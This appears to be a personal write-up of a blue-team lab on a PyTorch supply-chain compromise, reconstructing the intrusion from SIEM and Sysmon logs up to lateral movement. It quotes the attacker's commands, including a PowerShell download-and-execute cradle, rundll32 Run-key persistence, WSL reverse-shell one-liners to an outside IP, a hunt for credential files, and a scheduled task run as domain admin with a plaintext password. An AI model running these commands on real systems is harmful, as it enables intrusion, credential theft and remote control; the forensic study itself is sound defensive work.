### Poisoned PyTorch Lab

Goal: `Investigate a software supply-chain compromise that escalates into a ransomware attack, with emphasis on identifying pre-encryption operations.`

Scenario: `On 2 February 2026 (UTC), a developer at unucorb executed a model training script from Visual Studio Code on PC01 as part of an internal AI/ML project. Unbeknownst to the user, a trusted third-party Python dependency within the project had been tampered with, resulting in silent code execution and the establishment of remote access on the workstation. Your objective is to analyze the provided SIEM telemetry and host-based artifacts to reconstruct the end-to-end intrusion timeline, determine how initial access was achieved, track attacker activity across the domain, and identify pre-encryption behavior and ransomware impact used to maximize damage.`

Just notes....

Initial Access
--------------

Initial access was achieved via a software supply-chain compromise involving the Python dependency PyTorch (torch). The torch package is a trusted third-party machine learning library that had been tampered with to include a malicious backdoor in this scenario. When the developer executed the model training script from Visual Studio Code on PC01, the Python interpreter imported the torch module as part of the application runtime. Because the installed version of the dependency had been compromised, malicious code embedded within the package executed automatically during the import process. The malicious code spawned a hidden PowerShell process which downloaded and executed a second-stage payload from the attacker-controlled host: **http://<54.93.78.216>/a**
This established remote access to the workstation, initiating the attacker’s foothold in the environment. This attack is effective because developers inherently trust widely used dependencies, and importing a module in Python executes package initialization code automatically. As a result, malicious code embedded in a dependency can run without any additional user interaction beyond executing the application.

Execution
---------

The origin of this instrusion came from a script the developer ran in his AI/ML project directory, `C:\Users\michelvic\torch-inference-stack\training\train.py`.
At 2026-02-02 01:17:01, torch lib already imported meaning the malicious PS command from above executed on PC01. Pivoting to outbound comms (Event ID 3 -- Sysmon Logs) from PC01 following the PS download, michelvic (worksation) contacted <54.93.78.216:80> to grab the first stage payload. This was at 2/2/2026 1:17:06 AM which coorelates with the powershell command execution seconds before. The IP was also visible above from the Sysmon Event ID 1 log too. 

Discovery
--------

So were dealing with a domain env that PC01 is aprt of. The attacker began performing recon to understand domain trust relatinships from PC01. The attacker most likely used a Windows native tool to perform that domnain trust enumeration. Here it is
```
nltestrk.exe
"C:\Windows\system32\nltest.exe" /domain_trusts
"C:\Windows\system32\nltest.exe" /domain_trusts /all_trusts
which most likely came from this -> powershell -nop -exec bypass -EncodedCommand bgBsAHQAZQBzAHQAIAAvAGQAbwBtAGEAaQBuAF8AdAByAHUAcwB0AHMA
```
What Im noticing is the attacker is supplying the target recon commands via PS as an encoded command which decodes right after to execute. 

Persistence #1
----------

The attacker dropped a secondary payload for persistence
```
powershell.exe -NoProfile -WindowStyle Hidden -Command "IEX ((new-object net.webclient).downloadstring('http://54.93.78.216:80/a'))"
....
RUNDLL32.EXE
rundll32.exe  C:\Users\michelvic\AppData\Roaming\updlate.dll, StartW
c:\Users\michelvic\torch-inference-stack\
timestamp: 2/2/2026 1:47:34 AM
```
this coorelates with the network logs
```
timestamp: 2/2/2026 1:47:36 AM
C:\Windows\System32\rundll32.exe
UNUCORB\michelvic
tcp
True
False
10.10.11.92
-
60120
-
False
54.93.78.216
-
80
-
```

This file creation activity/execution shows that the persistent payload was stored in a user-writeable directory. Lets grab the sha256 hash of the persistent DLL.
sha256: `

This DLL peformed registry modification to persist the DLL. The benign-looking value name it used to blend in with legit software is `Updater`
```
timestamp: 2/2/2026 1:48:39 AM
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
HKU\S-1-5-21-3415631042-2785832853-3881933999-1167\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater   # updlate.dll will run everytime the user logs in
rundll32.exe "C:\Users\michelvic\AppData\Roaming\updlate.dll",StartW   
UNUCORB\michelvic
```

Failed Privesc
-------

The attacker did escalate privs but before that, a privesc attempt was made to abuse an installed Windows feature that failed
```
C:\Windows\system32\cmd.exe /C where /R c:\windows bash.exe
C:\Windows\system32\cmd.exe /C where /R c:\windows wsl.exe
C:\Windows\system32\cmd.exe /C wsl whoami
C:\Windows\system32\cmd.exe /C wsl whoami
then logged internal linux processes
all done under the same user: UNUCORB\michelvic

then
C:\Windows\system32\cmd.exe /C wsl -u root <- attempt to escalate inside WSL
same logged internal linux processes
still under UNUCORB\michelvic

then ran C:\Windows\system32\cmd.exe /C wsl whoami
still under UNUCORB\michelvic
ran this C:\Windows\system32\cmd.exe /C wsl.exe cat ~/.bash_history <- looking for credentials/history
still under UNUCORB\michelvic

ran this C:\Windows\system32\cmd.exe /C wsl sudo whoami <- attempting sudo escalation
under the same UNUCORB\michelvic user

attempting a reverse shell from WSL
then ran C:\Windows\system32\cmd.exe /C wsl sudo sh -i >& /dev/udp/18.197.226.152/4242 0>&1 
and
C:\Windows\system32\cmd.exe /C wsl sh -i >& /dev/udp/18.197.226.152/4242 0>&1
and
C:\Windows\system32\cmd.exe /C wsl sh -i >& /dev/udp/18.197.226.152/4242
under the same UNUCORB\michelvic user
```

Credential Access
---------

After the failed privesc, the attacker moved to credential hunting and found a deployment artifact containing exposed creds. (It was powershell encoded)
```
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("IgBDADoAXAB1AG4AYQB0AHQAZQBuAGQALgB4AG0AbAAiACwAIAAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABQAGEAbgB0AGgAZQByAFwAVQBuAGEAdAB0AGUAbgBkAC4AeABtAGwAIgAsACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAUABhAG4AdABoAGUAcgBcAFUAbgBhAHQAdABlAG4AZABcAFUAbgBhAHQAdABlAG4AZAAuAHgAbQBsACIALAAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAHMAeQBzAHAAcgBlAHAALgBpAG4AZgAiACwAIAAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABzAHkAcwBwAHIAZQBwAFwAcwB5AHMAcAByAGUAcAAuAHgAbQBsACIAIAB8ACAAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAIAB7ACAAVABlAHMAdAAtAFAAYQB0AGgAIAAkAF8AIAB9ACAAfAAgACAAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQAIAB7ACAARwBlAHQALQBJAHQAZQBtACAAJABfACAAfQA="))

"C:\unattend.xml",
"C:\Windows\Panther\Unattend.xml",
"C:\Windows\Panther\Unattend\Unattend.xml",
"C:\Windows\System32\sysprep.inf",
"C:\Windows\System32\sysprep\sysprep.xml" | # up until here, these are a list of file commonly containing creds especially on the windows deployment config side
Where-Object { Test-Path $_ } | # checks if the files exist
ForEach-Object { Get-Item $_ } # return the files that exist
```
The attacker found exposed creds from unattend.xml. The attacker will most likely construct its lateral movement through these PS encoded commands as seen throughout the whole attack chain/investigation from the DLL that was placed to persist/run all these PS commands. 

Successful Pirvesc + Persistence #2
--------------------------------
The attacker used credentials recovered from the deployment artifact to register a scheduled task named “Chroom Updates” via PowerShell. The task was configured to run a malicious DLL using rundll32.exe under the DOMAIN\domain.admin account with highest privileges, establishing persistence and enabling privileged execution on the compromised system.
```
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("JABhAGMAdABpAG8AbgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAQQBjAHQAaQBvAG4AIABgACAAIAAgAC0ARQB4AGUAYwB1AHQAZQAgACIAcgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIgAgAGAAIAAgACAALQBBAHIAZwB1AG0AZQBuAHQAIAAnACIAQwA6AFwAVQBzAGUAcgBzAFwAbQBpAGMAaABlAGwAdgBpAGMAXABBAHAAcABEAGEAdABhAFwAUgBvAGEAbQBpAG4AZwBcAHUAcABkAGwAYQB0AGUALgBkAGwAbAAiACwAUwB0AGEAcgB0AFcAJwA="))


$action = New-ScheduledTaskAction `   -Execute "rundll32.exe" `   -Argument '"C:\Users\michelvic\AppData\Roaming\updlate.dll",StartW' # Define task action

[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("UgBlAGcAaQBzAHQAZQByAC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAGAAIAAgACAALQBUAGEAcwBrAE4AYQBtAGUAIAAiAEMAaAByAG8AbwBtACAAVQBwAGQAYQB0AGUAcwAiACAAYAAgACAAIAAtAEEAYwB0AGkAbwBuACAAJABhAGMAdABpAG8AbgAgAGAAIAAgACAALQBVAHMAZQByACAAIgBEAE8ATQBBAEkATgBcAGQAbwBtAGEAaQBuAC4AYQBkAG0AaQBuACIAIABgACAAIAAgAC0AUABhAHMAcwB3AG8AcgBkACAAIgBhAGQAdQBzAGUAcgBhAGQAQAAyADYAIgAgAGAAIAAgACAALQBSAHUAbgBMAGUAdgBlAGwAIABIAGkAZwBoAGUAcwB0ACAAYAAgACAAIAAtAEYAbwByAGMAZQA="))


Register-ScheduledTask `   -TaskName "Chroom Updates" `   -Action $action `   -User "DOMAIN\domain.admin" `   -Password "aduserad@26" `   -RunLevel Highest `   -Force # Register scheduled task

[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("UwB0AGEAcgB0AC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC0AVABhAHMAawBOAGEAbQBlACAAIgBDAGgAcgBvAG8AbQAgAFUAcABkAGEAdABlAHMAIgA=
"))

Start-ScheduledTask -TaskName "Chroom Updates" # Start the task
```
The scheduled task executes the malicious DLL under the DOMAIN\domain.admin account with highest privileges, allowing the attacker to run code with elevated domain credentials on PC01.

Lateral Movement
----------------
part 1

The attacker prepared for RDP-based lateral movement by adding the domain group unucorb.local\RDP Users to the local Remote Desktop Users group on PC01 using net1 localgroup. This grants members of that domain group permission to log in via RDP. The command was executed under NT AUTHORITY\SYSTEM, indicating it was performed with elevated privileges.
```
C:\Windows\system32\net1 localgroup "Remote Desktop Users" "unucorb.local\RDP Users" /add
Add domain group "unucorb.local\RDP Users" to local group "Remote Desktop Users" so the result is that members of unucorb.local\RDP Users can now log in via RDP to PC01

NT AUTHORITY\SYSTEM <- running as SYSTEM to perform this 
```

part 2

Using the Windows Security log, Event ID 4720 was queried to identify newly created domain accounts. This event records when a user account is created and includes both the creator account (Subject) and the new account (Target/New Account). The search: `index=* source="WinEventLog:Security" EventCode=4720` revealed that a rogue account named welsam was created in the UNUCORB domain on the domain controller DC01.unucorb.local at approximately: 2026-02-02T03:15:18.136229200Z. The Subject Account Name field indicates the account responsible for the action was: domain.admin. This confirms that the attacker used the previously compromised domain.admin credentials to create the unauthorized domain account as a persistence mechanism.

part 3

The event shows that the previously created rogue account welsam was added to a privileged domain group shortly after its creation on the domain controller DC01.unucorb.local. Relevant fields from the event include:
```
MemberSid: UNUCORB\welsam
MemberName: cn=welsam maslew,CN=Users,DC=unucorb,DC=local
```
which identifies the rogue account being added to the group. The privileged group is identified in the following fields:
```
TargetUserName: Domain Admins
TargetDomainName: UNUCORB
TargetSid: UNUCORB\Domain Admins
```
The SubjectUserName field confirms the action was performed using the previously compromised administrative account: SubjectUserName: domain.admin. The event occurred at approximately: 2026-02-02T03:15:31.289439500Z which is shortly after the rogue account welsam was created (Event 4720). This confirms that the attacker immediately escalated the account's privileges by adding it to the Domain Admins group, granting full administrative access across the domain and establishing long-term persistence within the environment.



